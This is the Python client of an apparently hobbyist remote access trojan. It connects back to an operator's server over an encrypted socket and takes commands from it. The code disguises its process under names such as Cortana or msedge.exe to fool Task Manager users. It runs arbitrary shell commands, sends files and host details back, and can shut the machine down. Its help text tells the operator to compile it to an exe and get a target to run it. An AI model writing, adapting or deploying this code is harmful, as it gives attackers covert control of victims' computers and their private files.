#Created:Mar2023  TimeTaken:Approx1week
#AdhritTheGreat
import time
try:
    import setproctitle
    import random
    import sys
    import socket
    import subprocess
    from cryptography.fernet import Fernet
    from termcolor import colored
    import os
    import chardet
    import util
    import requests#for get_ip function
except Exception as e:
    print("Major exception:\n")
    time.sleep(5)
    print(e,"\n\n")
    time.sleep(3)
    exit()

#Changing title of script to confuse Users who use taskmanager
list=['Cortana','msedge.exe','Cortana','Microsoft Edge','Desktop window manager','Registry','Windows Explorer']
title=random.choice(list)
time.sleep(9)
setproctitle.setproctitle(title)
x=setproctitle.getproctitle()
print("Renamed self into ",x)




terminal_accept=1000000
HOST = '127.0.0.1'
PORT = 4004

key=b'ObcwFG1Wp9noy1MniE5nN2BzfpwrUO0z10HQKQhYFqE='
fernet=Fernet(key)


# use this when creating the files option:
#output=colored("Commands-", "white", attrs=["bold"])+"\n"+colored("   help", "blue")+" -shows this banner\n"+colored("   dir", "blue")+" -shows all files that are in the directory where the script is running on the target\n"+colored("   type <filename>","blue")+" -prints a file on to the terminal "+colored("(Full path of file required in <filename>)\n","white",attrs=['bold'])+"      Thats all for now"
def rename_self():
    list=['Cortana','msedge.exe','Cortana (2)','Microsoft Edge (3)','Desktop window manager','Settings','Registry','Windows Explorer (2)']
    title=random.choice(list)
    time.sleep(9)
    setproctitle.setproctitle(title)
    x=setproctitle.getproctitle()
    print("Renamed self into ",x)
    return "Renamed self into:"+x
def detect_encoding(file_path):
    with open(file_path, 'rb') as file:
        raw_data = file.read()
        result = chardet.detect(raw_data)
    encoding = result['encoding']
    return str(encoding)
def encrypt(message):
    encMessage = fernet.encrypt(message.encode())
    return encMessage
def decrypt(message):
    deMessage = fernet.decrypt(message).decode()
    return deMessage
def run_command(command):
    print("\n\nrunning shell command:",command,"\n\n")
    process = subprocess.run(command, shell=True, capture_output=True, text=True)
    output=process.stdout
    print(output)
    return str(output)
def clear():
    process = subprocess.run("cls", shell=True, capture_output=True, text=True)
def dir_back():
    current_directory = os.getcwd()
    parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
    os.chdir(parent_directory)
    new_directory = os.getcwd()
    return new_directory
def special_cwd():
    cwd=os.getcwd().strip()
    try:
        cwd=cwd.replace("\\","?")
    except:
        cwd=cwd.replace("/","?")
    return cwd


while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            print(colored(f"Connecting to {HOST}:{PORT}", "green"))
            print(" ")
            time.sleep(4)
            while True:
                encrypted_command = s.recv(4096)
                print("Connected")
                print(" ")
                if not encrypted_command:
                    break
                command = str(decrypt(encrypted_command).strip()).lower()
                print(f"Received command from server: ",colored(command, "blue"),"\n")







                if 'help' in command and len(command)<5:
                    output=colored("Commands-", "white", attrs=["bold"])+"\n"+colored("   help", "blue")+"  -lists all commands\n"+colored("   info", "blue")+"  -about this program\n"+colored("   ip","blue")+"    -gives ip address of target\n"+colored("   cover","blue")+colored("(beta)","cyan")+" -script on target computer changes its name to prevent suspicion\n"+colored("   terminal", "blue")+colored("(beta)", "cyan")+" -runs all commands given after this command on a shell on the target system and gives back the output\n"+colored("   shutdown", "blue")+" -Shuts target computer down along with the code"+"\nUPCOMING:file-Browse and download files from target"
                elif 'info' in command and len(command)<5:
                    output="Created by"+colored(" Adhrit The Great\n","cyan")+colored("Use:","cyan")+"In client.py and server.py, edit the 'HOST' and 'PORT' variables, convert client.py to exe and make the target run it and run server.py in your computer (When converting client.py to exe,make sure you disable the shell opening)"
                elif 'ip' in command and len(command)<3:
                    try:
                        host_name = socket.gethostname()
                        ip=socket.gethostbyname(host_name)
                        output="Hostname:"+host_name+"\nIP:"+ip
                    except Exception as e:
                        output=colored("ERROR: "+e,"red")
                elif 'cover' in command and len(command)<6:
                    x=rename_self()
                    output=str(x.strip())
                elif 'banner' in command and len(command)<7:
                    output="ㅤ⠀"
                    # This will be handled by server
                elif command.lower()=='shutdown':
                    output="Shutting down...."
                    encrypted_output = encrypt(output)
                    s.sendall(encrypted_output)
                    print("Response sent: ",output)
                    os.system("shutdown /s /t 1")
                elif 'terminal' in command and len(command)<9:
                    print("\n|Terminal mode started|\n")
                    #Open terminal and run and report the result back
                    try:
                        while True:
                            encrypted_output=""
                            out=""
                            encrypted_command = s.recv(terminal_accept)
                            if not encrypted_command:
                                break
                            command = str(decrypt(encrypted_command).strip())
                            if len(command)>terminal_accept:
                                output=colored("ERROR: Your command was too long and will not be run","red")
                                encrypted_output = encrypt(output)
                                time.sleep(2)
                                s.sendall(encrypted_output)
                                print("Response sent: ",output)
                                continue
                            print(f"Received terminal command from server: {command}")
                            if command.lower()=="leave":
                                output='\n|Terminal mode closed|\n'
                                break
                            elif command.lower()=='help':
                                #colored("(beta)", "cyan")+
                                time.sleep(4)
                                output=colored("Special Commands-", "white", attrs=["bold"])+"\n"+"   No special commands for now"
                                encrypted_output = encrypt(output)
                                time.sleep(2)
                                s.sendall(encrypted_output)
                                print("Response sent: ",output)

                            elif 'cd' in command and len(command)<3:
                                out=run_command(command.strip())
                                output=str(out)
                                if len(output)<terminal_accept:
                                    print(output)
                                    encrypted_output = encrypt(output)
                                    time.sleep(2)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",output)
                                elif len(output)>terminal_accept:
                                    output=colored("ERROR: Output given by your command was too long to transmit ","red")
                                    encrypted_output = encrypt(output)
                                    time.sleep(2)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",output)
                            elif 'cd' in command and len(command)>3 and "&" not in command:
                                output="Use the "+colored("files","blue")+"option to browse and retrieve files"
                                output=str(output)
                                if len(output)<terminal_accept:
                                    print(output)
                                    encrypted_output = encrypt(output)
                                    time.sleep(2)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",output)
                                elif len(output)>terminal_accept:
                                    output=colored("ERROR: Output given by your command was too long to transmit ","red")
                                    encrypted_output = encrypt(output)
                                    time.sleep(2)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",output)

                            else:
                                out=run_command(command)
                                output=str(out)
                                time.sleep(2)
                                if len(output)<terminal_accept:
                                    print(output)
                                    encrypted_output = encrypt(output)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",output)
                                elif len(output)>terminal_accept:
                                    output=colored("ERROR: Output given by your command was too long to transmit ","red")
                                    encrypted_output = encrypt(output)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",output)


                    except Exception as e:
                        encrypted_output=""
                        output=colored("ERROR ","red")+e
                        encrypted_output = encrypt(output)
                        s.sendall(encrypted_output)
                        print("Response sent: ",output)
                    print("\n|Terminal mode closed|\n")
                    time.sleep(2)

                elif 'files' in command and len(command)<7:
                    try:
                        #first time output sent to give current working dir

                        output="outputcode2438: ~`~current_dircode2438:"+special_cwd()
                        encrypted_output = encrypt(output)
                        s.sendall(encrypted_output)
                        print("Response sent: ",output)
                    except Exception as e:
                        print(e)
                    while True:
                        output=""
                        try:
                            #output sent as a dict full of variables
                            encrypted_output=""
                            out=""
                            encrypted_command = s.recv(terminal_accept)
                            if not encrypted_command:
                                break
                            command = str(decrypt(encrypted_command).strip())
                            if len(command)>terminal_accept:
                                output=colored("ERROR: Your command was too long and will not be run","red")
                                encrypted_output = encrypt(output)
                                time.sleep(2)
                                s.sendall(encrypted_output)
                                print("Response sent: ",output)
                                continue
                            print(f"Received files command from server: {command}")
                            if command.lower()=="leave":
                                output='\n|Files mode closed|\n'
                                break
                            if "cd" in command and len(command)>3:
                                command=command.replace("cd","").strip()
                                if os.path.isdir(command):
                                    os.chdir(command)
                                    output=" "
                                else:
                                    output=command+" is not an existing directory"
                            elif "dir" in command and len(command)>4:
                                print("\n|RUNNING DIR *path*|\n")
                                try:
                                    output=run_command(command)
                                except:
                                    output=command+" is not an existing directory"
                            elif "cd" in command and ".." in command:
                                command=""
                                command=os.path.dirname(os.getcwd())
                                if os.path.isdir(command):
                                    os.chdir(command)
                                    output=""
                                else:
                                    output="ERROR "+command+" is not an existing directory"
                            elif "dir" in command and len(command)<4:
                                print("\n|RUNNING DIR|\n")
                                path=os.getcwd().strip()
                                output=run_command("dir "+path)
                            elif "help" in command and len(command)<6:
                                output=colored("Special Commands-", "white", attrs=["bold"])+"\n"+colored("   get_file ", "blue")+colored("<filepath>","blue")+" -Transfer a specific file to your computer"+colored(" (place full path of the file in place of <filepath>)\n","white",attrs=["bold"])
                            elif "get_file" in command and len(command)>9:
                                print("\n|RUNNING GET_FILE|\n")
                                command=command.strip("get_file").strip()
                                try:
                                    for type in [".txt", ".log", ".c", ".h", ".cpp", ".java", ".sh", ".bat", ".py", ".pl", ".sql", ".asm", ".css", ".js", ".html"]:
                                        if type in command:
                                            print("\nThis is a "+type+" file\n")
                                            output=run_command("more "+command.strip())
                                            break
                                        else:
                                            pass
                                except:
                                    output="Currently only text type files are supported :("
                                print("From get_File:",output)
                            elif "get_folder" in command and len(command)>11:
                                files = []
                                folders = []
                                command = command.strip("get_folder").strip()
                                if os.path.exists(command) and os.path.isdir(command):
                                    all_items = os.listdir(command)
                                    for item in all_items:
                                        item_path = os.path.join(command, item)
                                        if os.path.isfile(item_path):
                                            files.append(item_path)
                                        elif os.path.isdir(item_path):
                                            folders.append(item_path)
                                print(files)
                                print(folders)









                            else:
                                output=run_command(command)
                            output="outputcode2438:"+str(output)+"~`~current_dircode2438:"+special_cwd()
                            encrypted_output = encrypt(output)
                            s.sendall(encrypted_output)
                            print("\n\nResponse sent: ",output,"\n\n")
                        except Exception as e:
                            print("ERROR:'';llkd",e)











                else:
                    output=colored("No command "+command,"red")
                encrypted_output = encrypt(output)
                s.sendall(encrypted_output)
                print("Response sent: ",output)



            print("Connection closed,retrying every 30 seconds")

    except:
        print(colored("No server detected :(      [Retying in 30 sec]", "red"))
        time.sleep(30)
        continue
